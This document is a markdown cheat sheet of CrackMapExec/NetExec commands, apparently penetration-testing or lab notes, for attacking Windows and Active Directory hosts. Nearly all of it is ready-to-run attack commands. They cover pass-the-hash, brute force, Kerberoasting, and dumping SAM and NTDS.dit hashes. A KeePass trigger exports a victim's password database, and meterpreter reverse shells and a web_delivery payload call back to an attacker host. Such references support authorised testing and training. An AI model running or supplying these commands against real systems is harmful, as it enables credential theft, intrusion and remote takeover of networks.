# CrackMapExec

# **Connexions**

---

Null session

- `crackmapexec smb 10.10.10.10 -u "" up ""`

Connect to target using local account

- `crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'PASSWORD' --local-auth`

Pass the hash

- `crackmapexec smb 10.10.10.10 -u administrator -H 'NTHASH'`

Kerberos Auth

- `export KRB5CCNAME=$(realpath file.ccache)`
- `crackmapexec smb 10.10.10.10 -u username --use-kcache`

# Enumerate

---

## SMB

### Shares

- `crackmapexec smb 10.10.10.10 -u user -p 'password' --shares`

Spider module:

- `crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus`
    - `jq . /tmp/cme_spider_plus/x.json`
    
    Show all shares:
    
    - `cat file.json | jq '. | keys'`
    
    Show all files with shares:
    
    - `cat file.json | jq '. | map_values(keys)'`

Download all files to host:

- `crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false`
    - Output is in the folder `/tmp/cme_spider_plus/`

### Users

Domain Users:

- `crackmapexec smb 10.10.10.10 -u username -p 'password' --users`

Save usernames to the list `tmp.txt` is the output of the above command.

- `awk '{print $5}' tmp.txt | cut -d \\ -f2 > users.txt`
- `cat tmp.txt | awk '{ print $5 }' | cut -d '\' -f2 > users.txt`

via RID Brute Force:

- `crackmapexec smb 10.129.49.145 -u 'guest' -p '' --rid-brute 10000 > tmp.txt`
- `awk '{print $6,$7}' tmp.txt | cut -d \\ -f2 | grep "(SidTypeUser)" | awk '{print $1}' > users_rid.txt`

Local users:

- `crackmapexec smb 10.10.10.10 -u 'user' -p 'PASS' --local-users`

Check logged in users:

- `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers`

### Group

- `crackmapexec smb 10.10.10.10 -u username -p pass --group`

## **KeePass discover**

- `crackmapexec smb 10.10.10.10 -u username -p pass -M keepass_discover`

Adding Trigger to KeePass Configuration File

- `crackmapexec smb 10.10.10.10 -u username -p pass -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH=C:/Users/bob/AppData/Roaming/KeePass/KeePass.config.xml`

Restart the KeePass.exe process

- `crackmapexec smb 10.10.10.10 -u username -p pass -M keepass_trigger -o ACTION=RESTART`

Polling the Exported Data from the Compromised Target

- `crackmapexec smb 10.10.10.10 -u username -p pass -M keepass_trigger -o ACTION=POLL`
    - `cat /tmp/export.xml | grep -i protectinmemory -A 5`

Clean Configuration File Changes

- `crackmapexec smb 10.10.10.10 -u username -p pass -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=C:/Users/bob/AppData/Roaming/KeePass/KeePass.config.xml`

Running keeppass_trigger ALL in One Command

- `crackmapexec smb 10.10.10.10 -u username -p pass -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/bob/AppData/Roaming/KeePass/KeePass.config.xml`

## Ldap

### Kerberoasting

- `NetExec ldap 10.10.10.10 -u '' -p '' --kerberoasting kerberoasting.out`

### ASP

- `NetExec ldap 10.10.10.10 -u '' -p '' --asreproast asreproast.out`

### Users

Retrieve User Description

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M user-desc`

With keywords

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M user-desc -o KEYWORDS=pwd,admin`

Membership

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M groupmembership -o USER=bob`

### daclread

Read Grace User's DACL

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M daclread -o TARGET=bob ACTION=read`

Users with DCSync rights

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M daclread -o TARGET_DN="DC=dcname,DC=local" ACTION=read RIGHTS=DCSync`

### Local Administrator Password Solution (LAPS)

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M laps`

### Machine Account Quota (MAQ)

- `crackmapexec ldap 10.10.10.10 -u name -p pass -M maq`

# Brute Force

---

- `crackmapexec smb 10.10.10 -u name/list.txt -p pw/list.txt --continue-on-success`

# **Getting credentials**

---

Dump local SAM hashes

- `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam`

Dump the NTDS.dit from DC using methods from [secretsdump.py](http://secretsdump.py/)

- `crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds`

Dsync

- `nxc smb 10.10.10.10 -u 'name' -p 'pss' -k -M ntdsutil`

Uses the Volume Shadow copy Service

- `crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss`

Dump the NTDS.dit password history

- `crackmapexec smb 192.168.1.0 -u UserNAme -p 'PASSWORDHERE' --ntds-history`

# Command e**xecution**

---

There are 3 different command execution methods (in default order)

1. wmiexec --> WMI
2. atexec --> scheduled task
3. smbexec --> creating and running a service

Through cmd.exe (admin privileges required)

- `crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'`

Force the smbexec

- `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec`

Through PowerShell (admin privileges required)

- `crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'`

# Getting Metasploit shell

---

## `Met_Inject` module

```html
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST tun0
set exitonsession false
exploit -j
```

- `crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444`

## `web_delivery` module

```html
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set SRVHOST tun0
set SRVPORT 80
set target 2
set LPORT 445
run -j
```

- `crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS`
